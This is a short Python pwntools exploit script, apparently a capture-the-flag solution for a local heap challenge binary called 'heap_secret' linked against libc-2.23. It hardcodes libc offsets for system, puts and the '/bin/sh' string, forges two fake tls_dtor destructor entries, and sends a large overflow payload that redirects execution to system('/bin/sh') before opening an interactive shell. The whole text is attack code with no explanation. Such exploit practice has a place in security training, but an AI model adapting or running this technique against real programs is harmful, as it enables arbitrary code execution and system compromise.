from pwn import *

libc_base_addr = 0x7ffff7a15000
system_addr = libc_base_addr + 0x46590
puts_addr = libc_base_addr + 0x6fd60
binsh_addr = libc_base_addr + 0x17c8c3

p = process('./heap_secret',env = {"LD_PRELOAD":"./libc-2.23.so"})

p.recvuntil("address: ")
r = p.recvuntil("\n")
gdb.attach(p)
r = input("mapped_addr: ")
mapped_addr = int(r, 16)
print "mapped_addr: " + hex(mapped_addr)

gdb.attach(p)

#fake two tls_dtor,puts('/bin/sh') and system('/bin/sh')
#fake tls_dtor1
payload = p64(0) + p64(0x31) + p64(puts_addr) + p64(binsh_addr) + p64(mapped_addr + 0x100) + p64(mapped_addr + 0x40)
#fake tls_dtor2
payload += p64(0) + p64(0x31) + p64(system_addr) + p64(binsh_addr) + p64(mapped_addr + 0x100) + p64(0)
payload += 'a' * (0x100000 - 0x60 + 0x16E0) + p64(mapped_addr + 0x10)
p.sendline(payload)

sleep(1)
p.interactive()
